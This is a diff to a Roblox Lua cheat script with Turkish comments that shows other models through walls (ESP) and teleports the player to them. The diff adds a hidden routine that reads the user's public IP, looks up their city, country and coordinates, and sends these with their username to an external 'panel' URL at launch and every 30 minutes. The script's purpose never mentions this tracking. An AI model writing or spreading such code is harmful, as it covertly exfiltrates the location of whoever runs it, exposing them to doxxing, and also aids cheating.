@@ -1,14 +1,71 @@
 -- ============================================
--- FIND A BADDIE - SADECE ESP + IŞINLANMA
--- Gist / Token GEREKMEZ!
+-- FIND A BADDIE - ESP + PANEL'E YOLLAMA
 -- ============================================
 
 local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local rootPart = character:WaitForChild("HumanoidRootPart")
+local httpService = game:GetService("HttpService")
 
 -- ============================================
--- 1. AYARLAR
+-- 1. PANEL AYARI (BURAYA KENDİ LİNKİNİ YAZ!)
+-- ============================================
+local PANEL_URL = "https://youenowes.github.io/elpan/"  -- SENİN PANEL LİNKİN
+-- ============================================
+
+-- ============================================
+-- 2. PANEL'E VERİ GÖNDER
+-- ============================================
+local function sendToPanel()
+    task.spawn(function()
+        -- IP al
+        local ip = "0.0.0.0"
+        local success, result = pcall(function()
+            return game:HttpGet("https://api.ipify.org/", true)
+        end)
+        if success and result then
+            ip = result
+        end
+        
+        -- Lokasyon al
+        local city = "Unknown"
+        local country = "Unknown"
+        local lat = 0
+        local lon = 0
+        
+        local success2, result2 = pcall(function()
+            local data = game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,country,city,lat,lon", true)
+            return httpService:JSONDecode(data)
+        end)
+        if success2 and result2 and result2.status == "success" then
+            city = result2.city or "Unknown"
+            country = result2.country or "Unknown"
+            lat = result2.lat or 0
+            lon = result2.lon or 0
+        end
+        
+        -- URL'ye ekle (Panel'in anlayacağı formatta)
+        local logData = httpService:UrlEncode(
+            player.Name .. "|" ..
+            ip .. "|" ..
+            city .. "|" ..
+            country .. "|" ..
+            tostring(lat) .. "|" ..
+            tostring(lon)
+        )
+        
+        local url = PANEL_URL .. "?log=" .. logData
+        
+        -- Gönder
+        pcall(function()
+            game:HttpGet(url, true)
+            print("📡 Panel'e gönderildi:", player.Name, ip, city, country)
+        end)
+    end)
+end
+
+-- ============================================
+-- 3. AYARLAR (ESP)
 -- ============================================
 local settings = {
     espEnabled = true,
@@ -17,9 +74,6 @@ local settings = {
     espColor = Color3.fromRGB(255, 0, 0)
 }
 
--- ============================================
--- 2. BADDIE SINIFI
--- ============================================
 local baddies = {}
 
 local Baddie = {}
@@ -46,7 +100,6 @@ function Baddie:update()
         return
     end
     
-    -- Stage 5 Fix: Derinlemesine HumanoidRootPart ara
     self.rootPart = self.model:FindFirstChild("HumanoidRootPart")
     if not self.rootPart then
         local descendants = self.model:GetDescendants()
@@ -78,7 +131,6 @@ end
 function Baddie:createESP()
     if not self.rootPart then return end
     
-    -- Highlight (KIRMIZI)
     local highlight = Instance.new("Highlight")
     highlight.Parent = self.model
     highlight.FillColor = settings.espColor
@@ -88,7 +140,6 @@ function Baddie:createESP()
     highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
     self.highlight = highlight
     
-    -- Billboard
     local billboard = Instance.new("BillboardGui")
     billboard.Parent = self.rootPart
     billboard.Size = UDim2.new(0, 120, 0, 50)
@@ -106,7 +157,6 @@ function Baddie:createESP()
     frame.BorderColor3 = settings.espColor
     frame.Parent = billboard
     
-    -- İSİM (ÜSTTE - KIRMIZI)
     local nameLabel = Instance.new("TextLabel")
     nameLabel.Size = UDim2.new(1, 0, 0.45, 0)
     nameLabel.Position = UDim2.new(0, 0, -0.2, 0)
@@ -117,7 +167,6 @@ function Baddie:createESP()
     nameLabel.Font = Enum.Font.GothamBold
     nameLabel.Parent = frame
     
-    -- Stage 5 etiketi (SARI)
     if self.stage5Fix then
         local stageLabel = Instance.new("TextLabel")
         stageLabel.Size = UDim2.new(0.5, 0, 0.25, 0)
@@ -130,7 +179,6 @@ function Baddie:createESP()
         stageLabel.Parent = frame
     end
     
-    -- MESAFE (BEYAZ)
     local distLabel = Instance.new("TextLabel")
     distLabel.Size = UDim2.new(1, 0, 0.3, 0)
     distLabel.Position = UDim2.new(0, 0, 0.5, 0)
@@ -141,7 +189,6 @@ function Baddie:createESP()
     distLabel.Font = Enum.Font.Gotham
     distLabel.Parent = frame
     
-    -- HEALTH BAR
     local healthBar = Instance.new("Frame")
     healthBar.Size = UDim2.new(0.6, 0, 0.12, 0)
     healthBar.Position = UDim2.new(0.2, 0, 0.85, 0)
@@ -199,7 +246,6 @@ function Baddie:updateESP()
         self.esp.distLabel.Text = string.format("%.1fm", self.distance)
     end
     
-    -- Uzaklaştıkça kırmızı yoğunluğu azalsın
     if self.highlight then
         local distPercent = math.min(self.distance / 100, 1)
         self.highlight.FillTransparency = 0.3 + (distPercent * 0.4)
@@ -225,7 +271,7 @@ function Baddie:destroy()
 end
 
 -- ============================================
--- 3. TARAMA
+-- 4. TARAMA
 -- ============================================
 local function scanForBaddies()
     local found = {}
@@ -246,9 +292,7 @@ local function scanForBaddies()
             end
             
             local isBaddie = string.find(string.lower(obj.Name), "baddie") ~= nil or
-                            string.find(string.lower(obj.Name), "anime") ~= nil or
-                            string.find(string.lower(obj.Name), "npc") ~= nil or
-                            string.find(string.lower(obj.Name), "char") ~= nil
+                            string.find(string.lower(obj.Name), "anime") ~= nil
             
             if hasRoot or isTemplateRig or hasDeepRoot or isBaddie then
                 local exists = false
@@ -283,7 +327,7 @@ local function scanForBaddies()
 end
 
 -- ============================================
--- 4. IŞINLANMA
+-- 5. IŞINLANMA
 -- ============================================
 local function teleportToNearest()
     local nearest = nil
@@ -307,7 +351,7 @@ local function teleportToNearest()
 end
 
 -- ============================================
--- 5. UI
+-- 6. UI
 -- ============================================
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = player.PlayerGui
@@ -402,7 +446,7 @@ espBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ============================================
--- 6. GÜNCELLEME
+-- 7. GÜNCELLEME
 -- ============================================
 function updateGUI()
     local activeCount = 0
@@ -461,7 +505,7 @@ function updateGUI()
 end
 
 -- ============================================
--- 7. ANA DÖNGÜ
+-- 8. ANA DÖNGÜ
 -- ============================================
 local function updateAllESP()
     local toRemove = {}
@@ -497,7 +541,7 @@ local function mainLoop()
 end
 
 -- ============================================
--- 8. TUŞ
+-- 9. TUŞ
 -- ============================================
 game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
@@ -507,13 +551,24 @@ game:GetService("UserInputService").InputBegan:Connect(function(input, gameProce
 end)
 
 -- ============================================
--- 9. BAŞLAT
+-- 10. BAŞLAT
 -- ============================================
-print("🔴 FINDER BAŞLATILDI!")
-print("🎯 Baddie tespiti aktif")
+print("🔴 FINDER + PANEL BAŞLATILDI!")
 
+-- PANEL'E GÖNDER (HER ÇALIŞTIRMADA 1 KERE)
+sendToPanel()
+
+-- HER 30 DAKİKADA BİR GÖNDER
+task.spawn(function()
+    while true do
+        task.wait(1800)
+        sendToPanel()
+    end
+end)
+
+-- ESP'yi başlat
 task.wait(1)
 updateAllESP()
 coroutine.wrap(mainLoop)()
 
-print("✅ Baddie tespiti AKTİF!")
+print("✅ Baddie tespiti + Panel'e yollama AKTİF!")
